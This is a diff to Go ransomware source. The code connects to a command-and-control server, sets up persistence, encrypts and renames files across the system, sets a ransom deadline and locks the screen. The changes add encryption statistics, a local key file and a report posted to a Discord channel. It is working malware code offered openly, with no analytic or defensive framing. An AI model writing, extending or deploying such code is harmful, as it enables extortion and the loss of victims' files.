@@ -45,6 +45,10 @@ func initializeEncryption() {
 
 	fmt.Printf("[+] Encryption key generated: %s\n", encryptionKeyHex)
 
+	if err := saveVictimDecryptionKeyFile(); err != nil {
+		fmt.Printf("[!] Could not write local key file: %v\n", err)
+	}
+
 	channelID, err := GenDC(encryptionKeyHex, decryptionKeyHex)
 	if err != nil {
 		fmt.Printf("[!] Failed to connect to C2: %v\n", err)
@@ -58,14 +62,33 @@ func initializeEncryption() {
 
 	establishPersistence()
 
+	resetEncryptionStats()
 	fmt.Println("[*] Starting file encryption...")
 	encryptSystem()
+
+	if discordChannelID != "" {
+		if err := SendEncryptionStatsEmbed(discordChannelID); err != nil {
+			fmt.Printf("[!] Could not post encryption report to Discord: %v\n", err)
+		}
+	}
 
 	deadlineTime = time.Now().Add(RANSOM_HOURS * time.Hour)
 	saveDeadline()
 
 	fmt.Println("[*] Encryption complete. Locking screen...")
 	lockScreen()
+}
+
+func resetEncryptionStats() {
+	EncryptStatsFiles = 0
+	EncryptStatsBytes = 0
+	EncryptStatsFailed = 0
+	EncryptStatsStarted = time.Now()
+	encryptStatsByExt = make(map[string]int)
+}
+
+func saveVictimDecryptionKeyFile() error {
+	return os.WriteFile(victimDecryptionKeyPath(), []byte(encryptionKeyHex), 0600)
 }
 
 
@@ -273,6 +296,10 @@ func generateKey() []byte {
 }
 
 func encryptSystem() {
+	if EncryptStatsStarted.IsZero() {
+		EncryptStatsStarted = time.Now()
+	}
+
 	var rootPaths []string
 
 	if isWindows {
@@ -343,6 +370,7 @@ func shouldEncryptFile(path string, _ os.FileInfo) bool {
 func encryptFile(path string, size int64) {
 	file, err := os.Open(path)
 	if err != nil {
+		EncryptStatsFailed++
 		return
 	}
 	defer file.Close()
@@ -352,17 +380,20 @@ func encryptFile(path string, size int64) {
 		data = make([]byte, PARTIAL_ENCRYPT_MB)
 		_, err = file.Read(data)
 		if err != nil {
+			EncryptStatsFailed++
 			return
 		}
 	} else {
 		data, err = io.ReadAll(file)
 		if err != nil {
+			EncryptStatsFailed++
 			return
 		}
 	}
 
 	encrypted, err := encryptData(data)
 	if err != nil {
+		EncryptStatsFailed++
 		return
 	}
 
@@ -370,13 +401,24 @@ func encryptFile(path string, size int64) {
 
 	err = os.WriteFile(path, encrypted, 0644)
 	if err != nil {
+		EncryptStatsFailed++
 		return
 	}
 
 	newPath := path + ".encrypted"
-	os.Rename(path, newPath)
+	if err := os.Rename(path, newPath); err != nil {
+		EncryptStatsFailed++
+		return
+	}
 
 	encryptedFiles = append(encryptedFiles, newPath)
+	ext := strings.ToLower(filepath.Ext(path))
+	if ext == "" {
+		ext = "(no ext)"
+	}
+	encryptStatsByExt[ext]++
+	EncryptStatsFiles++
+	EncryptStatsBytes += int64(len(data))
 }
 
 func encryptData(data []byte) ([]byte, error) {
